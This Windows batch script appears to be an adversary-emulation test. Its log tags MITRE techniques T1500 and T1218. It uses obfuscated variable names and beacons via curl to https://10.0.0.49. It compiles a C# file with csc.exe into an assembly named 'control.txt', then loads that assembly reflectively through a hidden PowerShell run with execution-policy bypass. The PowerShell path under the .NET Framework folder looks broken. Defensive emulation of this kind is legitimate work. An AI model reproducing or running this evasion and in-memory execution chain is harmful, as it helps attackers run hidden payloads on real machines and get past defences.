@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET recnn=%APPDATA%\8886\13ec14ab
SET detcfkn=https://10.0.0.49
SET uouoq=https://10.0.0.49/stage/2/icon.png?8886-10
SET lqyereup=ITZEL-S2BS
SET ufeybybm=10
SET hpnjatpj=control.txt
SET njozco=file.txt
SET kkjwr=8886
SET vkbuv=%APPDATA%\!ufeybybm!
SET jbzfd=!vkbuv!\macula-simulations.log
SET vrjef=%SystemRoot%\Microsoft.NET\Framework\v4.0.30319\csc.exe
SET krjev=%SystemRoot%\Microsoft.NET\Framework\v4.0.30319\powershell.exe

echo [!DATE! !TIME!][DEBUG][!lqyereup!]: heartbeat_start=!uouoq!>> "!jbzfd!" 2>nul
curl -k -s -o nul "!uouoq!"
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: heartbeat_complete=1>> "!jbzfd!" 2>nul

echo [!DATE! !TIME!][DEBUG][!lqyereup!]: chdir_start=!recnn!>> "!jbzfd!" 2>nul
cd /d "!recnn!" >nul 2>&1
if not errorlevel 1 (SET nopwn=1) else (SET nopwn=0&SET xufwv=chdir_failed)
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: chdir_result=!nopwn!>> "!jbzfd!" 2>nul

echo [!DATE! !TIME!][DEBUG][!lqyereup!]: compile_start=!njozco!>> "!jbzfd!" 2>nul
SET txssa=1
SET lxddt=
"!vrjef!" /target:library /out:"!hpnjatpj!" "!njozco!" >nul 2>&1
if errorlevel 1 SET txssa=0&SET lxddt=compile_failed
if exist "!hpnjatpj!" (SET qlqea=1) else (SET qlqea=0&SET txssa=0&SET lxddt=file_missing)
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: compile_result=!qlqea!>> "!jbzfd!" 2>nul

SET mjbov=!DATE!
SET oquvt=!TIME!
SET ytjfo=!mjbov:~-4!-!mjbov:~3,2!-!mjbov:~0,2! !oquvt:~0,2!:!oquvt:~3,2!:!oquvt:~6,2!.!oquvt:~9,3!
echo [!ytjfo!][!lqyereup!]: !ufeybybm!-!kkjwr!-T1500|Compile After Delivery=!txssa!:!lxddt!>> "!jbzfd!" 2>nul

echo [!DATE! !TIME!][DEBUG][!lqyereup!]: execute_start=!hpnjatpj!>> "!jbzfd!" 2>nul
SET kjfdw=1
SET lcyxn=
"!krjev!" -nop -w hidden -ep bypass -Command "& { [Reflection.Assembly]::Load([IO.File]::ReadAllBytes('!hpnjatpj!')).EntryPoint.Invoke($null, @(,[string[]]@())) }" >nul 2>&1
if errorlevel 1 SET kjfdw=0&SET lcyxn=assembly_load_failed
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: execute_result=!kjfdw!>> "!jbzfd!" 2>nul

SET mjbov=!DATE!
SET oquvt=!TIME!
SET ytjfo=!mjbov:~-4!-!mjbov:~3,2!-!mjbov:~0,2! !oquvt:~0,2!:!oquvt:~3,2!:!oquvt:~6,2!.!oquvt:~9,3!
echo [!ytjfo!][!lqyereup!]: !ufeybybm!-!kkjwr!-T1218|Signed Binary Proxy Execution=!kjfdw!:!lcyxn!>> "!jbzfd!" 2>nul